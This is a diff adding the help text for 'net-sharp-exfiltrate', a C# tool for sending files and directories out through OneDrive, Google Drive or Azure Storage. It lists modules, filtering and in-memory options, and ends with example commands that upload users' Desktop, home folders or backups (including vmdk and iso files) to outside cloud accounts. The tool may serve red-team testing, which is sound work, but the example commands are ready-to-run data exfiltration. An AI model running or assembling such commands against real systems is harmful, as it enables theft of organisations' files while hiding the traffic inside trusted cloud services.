@@ -1,0 +1,33 @@
+ABOUT
+    Modular C# framework to exfiltrate files or directories over trusted cloud channels.
+    Data is compressed and encrypted before upload. Supports extension and size filtering.
+
+USAGE:
+    net-sharp-exfiltrate --- <module> [options]
+
+MODULES:
+    OneDrive        Exfiltrate via OneDrive (username/password OAuth)
+    GoogleDrive     Exfiltrate via Google Drive (access token)
+    AzureStorage    Exfiltrate via Azure Storage Account (connection string)
+
+COMMON OPTIONS:
+    -f, --filepath       Path to file or directory to exfiltrate (required)
+    -e, --extensions     File extension filter separated by ; (pdf;doc;xls)
+    -s, --size           Max file size in MB
+    -m, --memoryonly     Compress zip entirely in memory
+
+ONEDRIVE OPTIONS:
+    -u, --username       OneDrive account email (required)
+    -p, --password       OneDrive account password (required)
+
+GOOGLEDRIVE OPTIONS:
+    -n, --appname        Application name (required)
+    -t, --accesstoken    Valid Google Drive access token (required)
+
+AZURESTORAGE OPTIONS:
+    -c, --connectionstring    Azure Storage connection string (required)
+
+EXAMPLES:
+    net-sharp-exfiltrate --- OneDrive --username user@corp.com --password "Pass" --filepath C:\Users\user\Desktop
+    net-sharp-exfiltrate --- GoogleDrive --appname App --accesstoken TOKEN --filepath C:\Users\user\ --extensions "pdf;" --memoryonly
+    net-sharp-exfiltrate --- AzureStorage --connectionstring CONN --filepath C:\Users\user\Backup --extensions "vmdk;iso" --size 500
